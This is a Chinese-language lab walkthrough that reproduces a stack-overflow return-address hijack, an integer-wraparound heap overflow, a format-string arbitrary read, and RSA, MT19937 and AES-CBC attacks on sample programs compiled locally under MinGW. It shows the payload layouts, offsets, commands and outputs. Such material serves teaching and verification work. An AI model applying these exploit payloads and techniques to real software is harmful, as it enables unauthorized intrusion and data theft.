# 04-walkthrough-local-pe.md — 真实案例走查：现场编译的 PE 漏洞程序 + 真算法回代

> **范围**：想在 Windows/MinGW 环境复现“栈溢出偏移→控制流劫持→整数回绕→格式化串任意读”的完整证据链。
> 环境：需要 Linux libc/ROP 的题目改用 WSL/远端靶机（本机工具链见 `scripts/`）。
> 案例目录：`Tool/cases/pwn-crypto03`（栈溢出+整数）、`Tool/cases/pwn-crypto05`（格式化串）、
> `Tool/cases/pwn-crypto04`（RSA/HMAC/MT19937/AES）。以下命令均在仓库根执行。

## 0. 目标与基线

- 目标：不是“打个 CTF flag”，而是验证**判据可机检**：偏移能两源对齐、控制流能跳到指定函数、
  整数回绕能造成真实堆破坏、格式化串能在未认证时读出 secret、密码学结论能回代。
- 环境：Windows 11 + MinGW gcc 15.2.0；`objdump`/`nm`/`readelf` 来自 mingw64；Python 3.12 + pycryptodome。
- 基线：`pwn-check.py` 只做静态预判；它给出 `NX/PIE/Canary/RELRO` 近似值，不执行目标。

```bash
python Tool/scripts/pwn-check.py --file Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe --json
```

原始输出片段（节选）：

```json
"protections": {
  "NX": "Enabled",
  "PIE": "Disabled",
  "Canary": "Not found",
  "RELRO": "N/A (PE 无 ELF RELRO)"
}
```

结论：PE32+、NX 开、无 PIE、无 canary。按 `mitigation-matrix.md`，栈溢出可直接覆盖返回地址，
不需要先泄漏代码基址；但仍要确认偏移。

## 1. 栈溢出：偏移两源对齐

```bash
gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe \
    Tool/cases/pwn-crypto03/input/stack_overflow.c
objdump -d Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe \
    > Tool/cases/pwn-crypto03/artifacts/stack_overflow.dis
printf 'hello\n' | Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe \
    2> Tool/cases/pwn-crypto03/artifacts/probe.txt
python Tool/skill/pwn-crypto/scripts/pwn-repro.py \
    --objdump Tool/cases/pwn-crypto03/artifacts/stack_overflow.dis --func vuln \
    --probe-log Tool/cases/pwn-crypto03/artifacts/probe.txt
```

反汇编关键行（`artifacts/stack_overflow.dis`）：

```text
140001474 <vuln>:
   140001478: 48 83 ec 70          sub    $0x70,%rsp
   140001499: 48 8d 55 b0          lea    -0x50(%rbp),%rdx     # buf
   1400014d4: e8 ef 12 00 00       call   1400027c8 <gets>
```

运行时 probe（`artifacts/probe.txt`）：

```text
buf=00000000005FFDD0 frame=00000000005FFE20 ret=0000000140001504
```

`pwn-repro.py` 的结论（`artifacts/repro.json`）：

```json
"evidence": [
  {"method": "objdump-rbp", "buffer_disp": 80, "offset": 88},
  {"method": "runtime-probe", "buffer_disp": 80, "offset": 88}
],
"consistent": true,
"offset": 88
```

结论：`buf` 在 `rbp-0x50`，saved RIP 在 `rbp+8`，偏移 `0x50+8=88`；两个独立来源一致。
注意：这是**本编译选项**下的数字，不是通用常量。

## 2. 控制流劫持：看到 marker 才算数

```bash
WIN=$(nm Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe | awk '$3=="win"{print "0x"$1}')
python Tool/cases/pwn-crypto03/input/exploit_stack.py \
  --bin Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe --offset 88 --win "$WIN"
```

原始输出（`artifacts/exploit_result.json`，节选）：

```json
{"payload_len": 96, "offset": 88, "win": "0x140001440", "rc": 0,
 "stdout": "AAAA...\\u0014\\r\\nWIN: control flow hijacked\\r\\n",
 "win_marker": true, "ok": true}
```

结论：payload 的 89–96 字节覆盖 saved RIP，函数返回到 `win()` 并打印 marker；rc=0。
边界：win() 必须自己 `exit(0)`，否则执行完 `ret` 会落到 payload 的 `A` 上，进程仍会崩溃；
“崩溃 + marker”也能证明控制流，但 rc 不为 0，不适合做稳定性统计。

## 3. 整数回绕：要看到分配过小与堆破坏

```bash
# 回绕分支：1073741825 * 4 = 4 (mod 2^32)
echo 1073741825 | Tool/cases/pwn-crypto03/artifacts/int_overflow.exe; echo "rc=$?"
# 对照分支
echo 16 | Tool/cases/pwn-crypto03/artifacts/int_overflow.exe; echo "rc=$?"
```

原始输出（`artifacts/int_overflow_wrap.log`）：

```text
count=1073741825 elem=4 bytes=4 wrapped=1
request=4 _msize=4
wrote=64 overflow=1
rc=127
count=16 elem=4 bytes=64 wrapped=0
request=64 _msize=64
wrote=64 overflow=0
freed without abort
rc=0
```

Python 直接取原始 NTSTATUS：

```python
subprocess.run([...], input=b"1073741825\n").returncode  # 3221226356 == 0xC0000374
```

结论：`0xC0000374` 是 `STATUS_HEAP_CORRUPTION`；说明 `memset(64)` 真的越过了 4 字节分配，
并且在 `free` 时被分配器检出。Git Bash 把同一状态显示为 `rc=127`，报告里要写清两种表示。

## 4. 格式化串：未认证读出 secret（并确认 `%n` 边界）

```bash
gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto05/artifacts/fmt_read.exe \
    Tool/cases/pwn-crypto05/input/fmt_read.c
nm Tool/cases/pwn-crypto05/artifacts/fmt_read.exe | grep -E ' secret| authenticated'
# 输出：0000000140003000 D secret / 0000000140007030 B authenticated
```

payload 结构：`b"%p%p%p%p%p%s"` + 4 个空格（补到 16B）+ `p64(0x140003000)`。
前 5 个 `%p` 消耗参数 1–5（rdx/r8/r9/buf[0:8]/buf[8:16]），`%s` 消耗参数 6（buf[16:24] 的地址）。

原始输出（`artifacts/leak_result.json`，节选）：

```text
stdout: "00007FFB414FF490...7070257025...FLAG{fmt_string_arbitrary_read_works}    \r\ndenied\r\n"
leaked_flag: true
authenticated: false
rc: 0
```

结论：程序最终走 `denied` 分支，但 secret 已经在 `%s` 处被打印——这是真实的任意读/信息泄漏。

边界探针（`artifacts/percent_n_result.txt`）：

```text
abcx=0
```

`printf("abc%n\n", &x)` 后 x 仍为 0：MinGW/UCRT 不执行 `%n`。
因此 **不能**把 glibc 的 `%n` 任意写套路直接搬到这里；写路线要换堆/逻辑或换 Linux 目标。

## 5. 密码学：每条都要回代

```bash
python Tool/cases/pwn-crypto04/input/make_inputs.py
PYTHONIOENCODING=utf-8 python Tool/skill/pwn-crypto/scripts/crypto-verify.py \
  --rsa Tool/cases/pwn-crypto04/input/rsa.json
PYTHONIOENCODING=utf-8 python Tool/skill/pwn-crypto/scripts/crypto-verify.py \
  --broadcast Tool/cases/pwn-crypto04/input/broadcast.json
```

原始输出（`artifacts/rsa.json` / `broadcast.json`，节选）：

```json
{"mode":"rsa","n_bits":1023,"e":3,"m":"250808731565...0465",
 "ascii":"pwn-crypto-real-rsa","verified":true}
{"mode":"broadcast","e":3,"moduli":3,"per_modulus":[true,true,true],
 "m_pow_e_lt_M":true,"verified":true}
```

结论：RSA 小指数开方与 Håstad 广播都通过 `pow(m,e,n)==c` 回代；HMAC 摘要由 `hmac` 现场算出，
篡改后必须失败；MT19937 用 624 个真实输出克隆后预测下 8 个一致；AES-ECB 的 `'A'*32` 产生重复块，
CBC 翻转 `C[0][3]` 后 `P[1][3]` 由 `0x63` 变 `0x43`。证据在 `Tool/cases/pwn-crypto04/artifacts/`。

## 6. 结论与可复用点

1. **偏移**：objdump 位移 + 运行时 `frame-buf` 是最便宜的双源校验；`pwn-repro.py` 把它机检化。
2. **控制流**：marker 函数比“崩溃”更强；但要注意目标函数返回后的落点。
3. **整数**：回绕只是前提，必须看到“分配过小 + 写入过长 + 堆破坏状态码”。
4. **格式化串**：参数位置是实测出来的（前 3 个在寄存器，buf 从参数 4 起）；地址含 NUL 时放末尾。
5. **平台**：UCRT 禁 `%n`、PE 无 RELRO/`__free_hook`；报告必须注明平台与工具链。
6. **密码学**：`verified=true` 才是结论；没有回代等式的“明文”一律不算。

## 失败判据

- `pwn-repro` 两源不一致仍继续写 exploit → 本走查被误用。
- 整数案例只贴 `bytes=4` 不贴 `_msize/写入长度/状态码` → 证据不足。
- 格式化串只打印 `%p` 没读出目标字节 → 只能算“疑似任意读”。
- 密码学只给 `m` 不写 `pow(m,e,n)==c` → 结论无效。

## 边界

- 本走查是 Windows/MinGW 证据链；Linux 的 RELRO/GOT/libc/`%n` 行为不同，需在目标环境重跑。
- 偏移 88、`0x140003000`、`0x140001440` 都是本案例编译产物里的地址；换二进制必须重算。
- 没有对真实生产系统做任何测试；所有程序都是本仓库内现场编译、用于授权实验的样本。
